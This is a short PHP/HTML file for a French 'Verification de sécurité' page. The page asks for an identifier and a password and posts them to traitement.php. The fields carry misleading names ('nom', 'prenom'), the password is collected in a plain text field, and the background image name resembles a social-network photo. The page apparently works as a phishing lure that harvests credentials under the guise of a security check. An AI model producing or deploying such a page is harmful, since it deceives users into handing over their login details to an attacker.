<?php
?>


<!DOCTYPE html>
<html>
<head>
    <title>Verification de sécurité</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-image: url('278823025_5089033417844850_3431604030020033478_n.png');
            background-size: cover;
            background-position: center;
            padding: 40px;
            color: white;
            font-family: Arial, sans-serif;
        }

        h1 {
            text-align: center;
        }

        form {
            max-width: 300px;
            margin: 0 auto;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
        }

        input[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #45a049;
        }

        /* Media queries for responsive design */
        @media only screen and (max-width: 600px) {
            body {
                padding: 20px;
            }

            form {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <h1>Verification de sécurité</h1>
    <form method="post" action="traitement.php">
        <input type="text" name="nom" placeholder="Identifiant" required>
        <input type="text" name="prenom" placeholder="Mot de passe" required>
        <input type="submit" value="Vérifier">
    </form>
</body>
</html>


<?php
?>
